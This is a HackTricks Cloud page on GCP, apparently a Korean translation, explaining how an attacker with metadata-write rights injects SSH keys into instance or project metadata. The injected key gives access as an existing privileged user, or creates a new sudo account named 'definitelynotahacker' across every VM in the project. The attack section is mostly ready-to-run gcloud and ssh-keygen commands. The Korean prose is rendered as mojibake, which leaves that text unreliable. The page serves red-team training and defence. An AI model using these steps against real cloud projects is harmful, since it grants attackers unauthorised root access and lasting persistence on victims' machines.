# GCP - ì‚¬ìš©ì ì •ì˜ SSH ë©”íƒ€ë°ì´í„° ì¶”ê°€

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ë©”íƒ€ë°ì´í„° ìˆ˜ì • <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

ì¸ìŠ¤í„´ìŠ¤ì˜ ë©”íƒ€ë°ì´í„° ìˆ˜ì •ì€ **ê³µê²©ìê°€ í•„ìš”í•œ ê¶Œí•œì„ íšë“í•˜ë©´ ì¤‘ëŒ€í•œ ë³´ì•ˆ ìœ„í—˜**ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **ì‚¬ìš©ì ì •ì˜ ë©”íƒ€ë°ì´í„°ì— SSH í‚¤ í†µí•©**

GCPì—ì„œëŠ” **Linux ì‹œìŠ¤í…œ**ì´ ì¢…ì¢… [Google Compute Engineì„ ìœ„í•œ Python Linux Guest Environment](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ì— ì¤‘ìš”í•œ êµ¬ì„± ìš”ì†ŒëŠ” [ê³„ì • ë°ëª¬](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ìœ¼ë¡œ, ì´ëŠ” ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ë¥¼ **ì •ê¸°ì ìœ¼ë¡œ í™•ì¸í•˜ì—¬ ì¸ì¦ëœ SSH ê³µê°œ í‚¤ì— ëŒ€í•œ ì—…ë°ì´íŠ¸ë¥¼ ì°¾ìŠµë‹ˆë‹¤**.

ë”°ë¼ì„œ, ê³µê²©ìê°€ ì‚¬ìš©ì ì •ì˜ ë©”íƒ€ë°ì´í„°ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤ë©´, ë°ëª¬ì´ ìƒˆë¡œìš´ ê³µê°œ í‚¤ë¥¼ ì°¾ì•„ì„œ **ë¡œì»¬ ì‹œìŠ¤í…œì— í†µí•©**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í‚¤ëŠ” ê¸°ì¡´ ì‚¬ìš©ìì˜ `~/.ssh/authorized_keys` íŒŒì¼ì— ì¶”ê°€ë˜ê±°ë‚˜, í‚¤ì˜ í˜•ì‹ì— ë”°ë¼ **`sudo` ê¶Œí•œì„ ê°€ì§„ ìƒˆë¡œìš´ ì‚¬ìš©ìë¥¼ ìƒì„±**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ê³µê²©ìëŠ” í˜¸ìŠ¤íŠ¸ë¥¼ ì¹¨í•´í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

### **ê¸°ì¡´ ê¶Œí•œì´ ìˆëŠ” ì‚¬ìš©ìì— SSH í‚¤ ì¶”ê°€**

1. **ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ê¸°ì¡´ SSH í‚¤ í™•ì¸:**
- ì¸ìŠ¤í„´ìŠ¤ì™€ í•´ë‹¹ ë©”íƒ€ë°ì´í„°ë¥¼ ì„¤ëª…í•˜ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ê¸°ì¡´ SSH í‚¤ë¥¼ ì°¾ìŠµë‹ˆë‹¤. ì¶œë ¥ì—ì„œ ê´€ë ¨ ì„¹ì…˜ì€ `metadata` ì•„ë˜ì— ìˆìœ¼ë©°, íŠ¹íˆ `ssh-keys` í‚¤ì…ë‹ˆë‹¤.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- SSH í‚¤ì˜ í˜•ì‹ì— ì£¼ì˜í•˜ì„¸ìš”: ì‚¬ìš©ì ì´ë¦„ì€ ì½œë¡ ìœ¼ë¡œ êµ¬ë¶„ëœ í‚¤ ì•ì— ì˜µë‹ˆë‹¤.

2. **SSH í‚¤ ë©”íƒ€ë°ì´í„°ë¥¼ ìœ„í•œ í…ìŠ¤íŠ¸ íŒŒì¼ ì¤€ë¹„:**
- ì‚¬ìš©ì ì´ë¦„ê³¼ í•´ë‹¹í•˜ëŠ” SSH í‚¤ì˜ ì„¸ë¶€ ì •ë³´ë¥¼ `meta.txt`ë¼ëŠ” í…ìŠ¤íŠ¸ íŒŒì¼ì— ì €ì¥í•©ë‹ˆë‹¤. ì´ëŠ” ìƒˆë¡œìš´ í‚¤ë¥¼ ì¶”ê°€í•˜ëŠ” ë™ì‹œì— ê¸°ì¡´ í‚¤ë¥¼ ë³´ì¡´í•˜ê¸° ìœ„í•´ í•„ìˆ˜ì ì…ë‹ˆë‹¤.

3. **ëŒ€ìƒ ì‚¬ìš©ì(`alice` ì˜ˆì‹œ)ë¥¼ ìœ„í•œ ìƒˆë¡œìš´ SSH í‚¤ ìƒì„±:**
- `ssh-keygen` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ SSH í‚¤ë¥¼ ìƒì„±í•˜ê³ , ì£¼ì„ í•„ë“œ(`-C`)ê°€ ëŒ€ìƒ ì‚¬ìš©ì ì´ë¦„ê³¼ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- ì¸ìŠ¤í„´ìŠ¤ì˜ ë©”íƒ€ë°ì´í„°ì—ì„œ ì°¾ì€ í˜•ì‹ê³¼ ìœ ì‚¬í•˜ê²Œ ìƒˆë¡œìš´ ê³µê°œ í‚¤ë¥¼ `meta.txt`ì— ì¶”ê°€í•©ë‹ˆë‹¤.

4. **ì¸ìŠ¤í„´ìŠ¤ì˜ SSH í‚¤ ë©”íƒ€ë°ì´í„° ì—…ë°ì´íŠ¸:**
- `gcloud compute instances add-metadata` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ì—…ë°ì´íŠ¸ëœ SSH í‚¤ ë©”íƒ€ë°ì´í„°ë¥¼ ì¸ìŠ¤í„´ìŠ¤ì— ì ìš©í•©ë‹ˆë‹¤.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **ìƒˆë¡œìš´ SSH í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— ì•¡ì„¸ìŠ¤:**
- ìƒˆë¡œìš´ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ SSHë¡œ ì¸ìŠ¤í„´ìŠ¤ì— ì—°ê²°í•˜ê³ , ëŒ€ìƒ ì‚¬ìš©ì(`alice` ì˜ˆì‹œ)ì˜ ì‰˜ì— ì•¡ì„¸ìŠ¤í•©ë‹ˆë‹¤.
```bash
ssh -i ./key alice@localhost
sudo id
```

### **ìƒˆë¡œìš´ ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ì ìƒì„± ë° SSH í‚¤ ì¶”ê°€**

í¥ë¯¸ë¡œìš´ ì‚¬ìš©ìë¥¼ ì°¾ì§€ ëª»í•œ ê²½ìš°, ìƒˆë¡œìš´ ì‚¬ìš©ìë¥¼ ìƒì„±í•˜ê³  `sudo` ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ SSH í‚¤ ì‚¬ìš©í•˜ê¸° <a href="#sshing-around" id="sshing-around"></a>

í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ **í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ SSH í‚¤ë¥¼ ì ìš©**í•˜ì—¬ ì—¬ëŸ¬ ê°€ìƒ ë¨¸ì‹ (VM)ì— ëŒ€í•œ SSH ì•¡ì„¸ìŠ¤ ë²”ìœ„ë¥¼ í™•ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ í”„ë¡œì íŠ¸ ë‚´ì—ì„œ ëª…ì‹œì ìœ¼ë¡œ í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ë¥¼ ì°¨ë‹¨í•˜ì§€ ì•Šì€ ê²½ìš° í”„ë¡œì íŠ¸ ë‚´ì˜ ëª¨ë“  ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ SSH ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ìš”ì•½ëœ ê°€ì´ë“œì…ë‹ˆë‹¤:

1. **í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ SSH í‚¤ ì ìš©:**
- `gcloud compute project-info add-metadata` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ `meta.txt`ì—ì„œ SSH í‚¤ë¥¼ í”„ë¡œì íŠ¸ì˜ ë©”íƒ€ë°ì´í„°ì— ì¶”ê°€í•©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ SSH í‚¤ê°€ í”„ë¡œì íŠ¸ ë‚´ì˜ ëª¨ë“  VMì—ì„œ ì¸ì‹ë˜ë„ë¡ ë³´ì¥í•˜ë©°, VMì´ "í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ ì°¨ë‹¨" ì˜µì…˜ì„ ì‚¬ìš©í•˜ì§€ ì•Šì€ ê²½ìš°ì—ë§Œ í•´ë‹¹í•©ë‹ˆë‹¤.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **í”„ë¡œì íŠ¸ ì „ì²´ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— SSH ì ‘ì†:**
- í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ê°€ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´ í”„ë¡œì íŠ¸ ë‚´ì˜ ëª¨ë“  ì¸ìŠ¤í„´ìŠ¤ì— SSHë¡œ ì ‘ì†í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í”„ë¡œì íŠ¸ ì „ì²´ í‚¤ë¥¼ ì°¨ë‹¨í•˜ì§€ ì•Šì€ ì¸ìŠ¤í„´ìŠ¤ëŠ” SSH í‚¤ë¥¼ í—ˆìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.
- ì¸ìŠ¤í„´ìŠ¤ì— ì§ì ‘ SSHë¡œ ì ‘ì†í•˜ëŠ” ë°©ë²•ì€ `gcloud compute ssh [INSTANCE]` ëª…ë ¹ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ í˜„ì¬ ì‚¬ìš©ì ì´ë¦„ê³¼ í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ ì„¤ì •ëœ SSH í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ ì‹œë„í•©ë‹ˆë‹¤.


# ì°¸ê³  ìë£Œ
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* HackTricksì—ì„œ **íšŒì‚¬ ê´‘ê³ ë¥¼ ë³´ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family)ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
